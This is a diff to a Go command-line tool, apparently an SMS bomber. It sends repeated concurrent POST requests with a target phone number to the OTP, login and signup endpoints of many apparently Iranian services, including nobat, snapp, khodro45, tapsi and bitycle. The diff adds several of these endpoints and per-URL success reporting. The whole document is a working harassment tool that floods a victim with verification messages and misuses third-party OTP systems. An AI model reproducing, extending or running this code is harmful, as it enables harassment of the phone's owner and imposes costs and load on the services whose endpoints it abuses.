@@ -16,6 +16,13 @@ import (
 	"sync"
 )
 
+// RequestStatus holds the URL and the HTTP status code of a request.
+type RequestStatus struct {
+	URL        string
+	StatusCode int
+}
+
+// clearScreen clears the terminal screen based on the operating system.
 func clearScreen() {
 	cmd := exec.Command("clear")
 	if runtime.GOOS == "windows" {
@@ -25,20 +32,25 @@ func clearScreen() {
 	cmd.Run()
 }
 
-func sendJSONRequest(ctx context.Context, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- int) {
+// sendJSONRequest sends an HTTP POST request with a JSON payload.
+// It uses a context for cancellation, a WaitGroup for synchronization,
+// and a channel to report the URL and HTTP status code.
+func sendJSONRequest(ctx context.Context, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- RequestStatus) {
 	defer wg.Done()
 
 	jsonData, err := json.Marshal(payload)
 	if err != nil {
 		fmt.Println("\033[01;31m[-] Error while encoding JSON for", url, "!\033[0m")
-		ch <- http.StatusInternalServerError
+		// Send status with error code and URL
+		ch <- RequestStatus{URL: url, StatusCode: http.StatusInternalServerError}
 		return
 	}
 
 	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
 	if err != nil {
 		fmt.Println("\033[01;31m[-] Error while creating request to", url, "!\033[0m", err)
-		ch <- http.StatusInternalServerError
+		// Send status with error code and URL
+		ch <- RequestStatus{URL: url, StatusCode: http.StatusInternalServerError}
 		return
 	}
 	req.Header.Set("Content-Type", "application/json")
@@ -47,25 +59,32 @@ func sendJSONRequest(ctx context.Context, url string, payload map[string]interfa
 	if err != nil {
 		if ctx.Err() == context.Canceled {
 			fmt.Println("\033[01;33m[!] Request to", url, "canceled.\033[0m")
-			ch <- 0
+			// Send status with a specific code (e.g., 0) for cancellation and URL
+			ch <- RequestStatus{URL: url, StatusCode: 0}
 			return
 		}
 		fmt.Println("\033[01;31m[-] Error while sending request to", url, "!", err)
-		ch <- http.StatusInternalServerError
+		// Send status with error code and URL for other errors
+		ch <- RequestStatus{URL: url, StatusCode: http.StatusInternalServerError}
 		return
 	}
 	defer resp.Body.Close()
 
-	ch <- resp.StatusCode
+	// Send the URL and HTTP status code
+	ch <- RequestStatus{URL: url, StatusCode: resp.StatusCode}
 }
 
-func sendFormRequest(ctx context.Context, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- int) {
+// sendFormRequest sends an HTTP POST request with a form-urlencoded payload.
+// It uses a context for cancellation, a WaitGroup for synchronization,
+// and a channel to report the URL and HTTP status code.
+func sendFormRequest(ctx context.Context, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- RequestStatus) {
 	defer wg.Done()
 
 	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, strings.NewReader(formData.Encode()))
 	if err != nil {
 		fmt.Println("\033[01;31m[-] Error while creating form request to", url, "!\033[0m", err)
-		ch <- http.StatusInternalServerError
+		// Send status with error code and URL
+		ch <- RequestStatus{URL: url, StatusCode: http.StatusInternalServerError}
 		return
 	}
 	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
@@ -74,16 +93,19 @@ func sendFormRequest(ctx context.Context, url string, formData url.Values, wg *s
 	if err != nil {
 		if ctx.Err() == context.Canceled {
 			fmt.Println("\033[01;33m[!] Request to", url, "canceled.\033[0m")
-			ch <- 0
+			// Send status with a specific code (e.g., 0) for cancellation and URL
+			ch <- RequestStatus{URL: url, StatusCode: 0}
 			return
 		}
 		fmt.Println("\033[01;31m[-] Error while sending request to", url, "!", err)
-		ch <- http.StatusInternalServerError
+		// Send status with error code and URL for other errors
+		ch <- RequestStatus{URL: url, StatusCode: http.StatusInternalServerError}
 		return
 	}
 	defer resp.Body.Close()
 
-	ch <- resp.StatusCode
+	// Send the URL and HTTP status code
+	ch <- RequestStatus{URL: url, StatusCode: resp.StatusCode}
 }
 
 func main() {
@@ -152,20 +174,20 @@ func main() {
 	}()
 
 	var wg sync.WaitGroup
-	ch := make(chan int, repeatCount*10)
+	// Change channel type to RequestStatus
+	ch := make(chan RequestStatus, repeatCount*10) // Adjusted buffer size
 
-	// --- Debugging Prints ---
-	fmt.Printf("Debug: Input phone string: \"%s\"\n", phone)
+	// Convert phone string to int64 for specific APIs if needed
 	phoneTrimmed := strings.TrimPrefix(phone, "0")
-	fmt.Printf("Debug: Phone string after TrimPrefix(\"0\"): \"%s\"\n", phoneTrimmed)
-	// Changed Atoi to ParseInt with bitSize 64
 	phoneInt64, err := strconv.ParseInt(phoneTrimmed, 10, 64)
-	fmt.Printf("Debug: Result of ParseInt: %v, Error: %v\n", phoneInt64, err)
-	// --- End Debugging Prints ---
+	// Keep the debugging prints if needed, otherwise remove them
+	// fmt.Printf("Debug: Input phone string: \"%s\"\n", phone)
+	// fmt.Printf("Debug: Phone string after TrimPrefix(\"0\"): \"%s\"\n", phoneTrimmed)
+	// fmt.Printf("Debug: Result of ParseInt: %v, Error: %v\n", phoneInt64, err)
 
 
 	if err != nil {
-		fmt.Println("\033[01;31m[-] Warning: Could not convert phone number to integer. Skipping APIs that require integer format.\033[0m")
+		fmt.Println("\033[01;31m[-] Warning: Could not convert phone number to integer. Requests to APIs requiring integer format may fail.\033[0m")
 	}
 
 	for i := 0; i < repeatCount; i++ {
@@ -183,28 +205,26 @@ func main() {
 		}, &wg, ch)
 
 		// api.nobat.ir (JSON) - Corrected payload (integer)
-		// Pass phoneInt64 and err to the goroutine to ensure correct scope
+		// Pass phoneInt64 and err to the goroutine
 		wg.Add(1)
-		// Changed pInt type to int64
-		go func(ctx context.Context, url string, pInt64 int64, conversionErr error, wg *sync.WaitGroup, ch chan<- int) {
+		go func(ctx context.Context, url string, pInt64 int64, conversionErr error, wg *sync.WaitGroup, ch chan<- RequestStatus) { // Changed channel type here
 			defer wg.Done()
 			if conversionErr == nil {
 
-				// Use pInt64 in the payload
 				payload := map[string]interface{}{
 					"mobile": pInt64,
 				}
 				jsonData, marshalErr := json.Marshal(payload)
 				if marshalErr != nil {
 					fmt.Println("\033[01;31m[-] Error while encoding JSON for", url, "!\033[0m")
-					ch <- http.StatusInternalServerError
+					ch <- RequestStatus{URL: url, StatusCode: http.StatusInternalServerError} // Send status with URL
 					return
 				}
 
 				req, reqErr := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
 				if reqErr != nil {
 					fmt.Println("\033[01;31m[-] Error while creating request to", url, "!\033[0m", reqErr)
-					ch <- http.StatusInternalServerError
+					ch <- RequestStatus{URL: url, StatusCode: http.StatusInternalServerError} // Send status with URL
 					return
 				}
 				req.Header.Set("Content-Type", "application/json")
@@ -213,22 +233,43 @@ func main() {
 				if clientErr != nil {
 					if ctx.Err() == context.Canceled {
 						fmt.Println("\033[01;33m[!] Request to", url, "canceled.\033[0m")
-						ch <- 0
+						ch <- RequestStatus{URL: url, StatusCode: 0} // Send status with URL
 						return
 					}
 					fmt.Println("\033[01;31m[-] Error while sending request to", url, "!", clientErr)
-					ch <- http.StatusInternalServerError
+					ch <- RequestStatus{URL: url, StatusCode: http.StatusInternalServerError} // Send status with URL
 					return
 				}
 				defer resp.Body.Close()
-				ch <- resp.StatusCode
+				ch <- RequestStatus{URL: url, StatusCode: resp.StatusCode} // Send status with URL
 
 			} else {
-
-				ch <- http.StatusInternalServerError
-
+				// If conversion failed, report an error status with the URL
+				ch <- RequestStatus{URL: url, StatusCode: http.StatusInternalServerError} // Send status with URL
 			}
 		}(ctx, "https://api.nobat.ir/patient/login/phone", phoneInt64, err, &wg, ch)
+
+
+		wg.Add(1)
+		go sendJSONRequest(ctx, fmt.Sprintf("https://digitalsignup.snapp.ir/otp?method=sms_v2&cellphone=%v&_rsc=1hiza", phone), map[string]interface{}{
+			"cellphone": phone,
+		}, &wg, ch)
+
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://khodro45.com/api/v2/customers/otp/", map[string]interface{}{
+			"mobile": phone,
+		}, &wg, ch)
+
+
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://accounts-api.tapsi.ir/api/v1/sso-user/auth", map[string]interface{}{
+			"phone_number": phone,
+		}, &wg, ch)
+
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://api.bitycle.com/api/account/register", map[string]interface{}{
+			"phone": phone,
+		}, &wg, ch)
 
 
 		wg.Add(1)
@@ -246,6 +287,7 @@ func main() {
 			"username": phone,
 		}, &wg, ch)
 
+
 	}
 
 	go func() {
@@ -253,11 +295,13 @@ func main() {
 		close(ch)
 	}()
 
-	for statusCode := range ch {
-		if statusCode >= 400 || statusCode == 0 {
-			fmt.Println("\033[01;31m[-] Error ! ")
-		} else {
-			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
+	// Read RequestStatus from the channel
+	for status := range ch {
+		// Added a check for status code 0 which we used for cancellation
+		if status.StatusCode >= 400 || status.StatusCode == 0 { // Treat any 4xx or 5xx as an error, plus our cancellation code 0
+			fmt.Printf("\033[01;31m[-] Error ! \033[0m (Status: %d, URL: %s)\n", status.StatusCode, status.URL) // Include URL and Status Code
+		} else { // Assume 2xx and 3xx are successful or redirects (treated as success for this purpose)
+			fmt.Printf("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended\033[0m (Status: %d, URL: %s)\n", status.StatusCode, status.URL) // Include URL and Status Code
 		}
 	}
 }
